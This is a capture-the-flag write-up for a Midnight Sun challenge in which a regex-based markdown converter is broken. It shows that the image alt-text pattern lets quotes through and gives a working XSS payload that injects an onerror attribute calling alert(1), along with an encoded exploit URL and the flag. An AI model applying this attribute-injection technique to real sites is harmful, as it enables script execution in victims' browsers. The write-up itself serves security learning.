---
tags: ["xxs"]
---
# Challenge
> Someone told me to use a lib, but real developers rock regex one-liners.

This challenge provides a website that converts markdown to html for display.
The conversion code is implemented with a bunch of regex search-and-replaces.
The task here is to find input markdown that invokes `alert(1)` once converted to html.

```js
function markdown(text){
  text = text
  .replace(/[<]/g, '')
  .replace(/----/g,'<hr>')
  .replace(/> ?([^\n]+)/g, '<blockquote>$1</blockquote>')
  .replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>')
  .replace(/__([^_]+)__/g, '<b>$1</b>')
  .replace(/\*([^\s][^*]+)\*/g, '<i>$1</i>')
  .replace(/\* ([^*]+)/g, '<li>$1</li>')
  .replace(/##### ([^#\n]+)/g, '<h5>$1</h5>')
  .replace(/#### ([^#\n]+)/g, '<h4>$1</h4>')
  .replace(/### ([^#\n]+)/g, '<h3>$1</h3>')
  .replace(/## ([^#\n]+)/g, '<h2>$1</h2>')
  .replace(/# ([^#\n]+)/g, '<h1>$1</h1>')
  .replace(/(?<!\()(https?:\/\/[a-zA-Z0-9./?#-]+)/g, '<a href="$1">$1</a>')
  .replace(/!\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#]+)\)/g, '<img src="$2" alt="$1"/>')
  .replace(/(?<!!)\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#-]+)\)/g, '<a href="$2">$1</a>')
  .replace(/`([^`]+)`/g, '<code>$1</code>')
  .replace(/```([^`]+)```/g, '<code>$1</code>')
  .replace(/\n/g, "<br>");

  return text;
}
```

# Solution

One of the regexes looks particularly scary:
```js
.replace(/!\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#]+)\)/g, '<img src="$2" alt="$1"/>')
```
The first capture group (the alt text) allows for all characters including quotes.
This can easily be used to insert custom attributes and invoke custom javascript:
```js
> markdown("![alt\" onerror=\"javascript:alert(1)](https://src)")
'<img src="https://src" alt="alt" onerror="javascript:alert(1)"/>'
```

http://marcodowno-01.play.midnightsunctf.se:3001/markdown?input=%21%5Balt%22%20onerror%3D%22javascript%3Aalert%281%29%5D%28https%3A%2F%2Fsrc%29

midnight{wh0_n33ds_libs_wh3n_U_g0t_reg3x?}
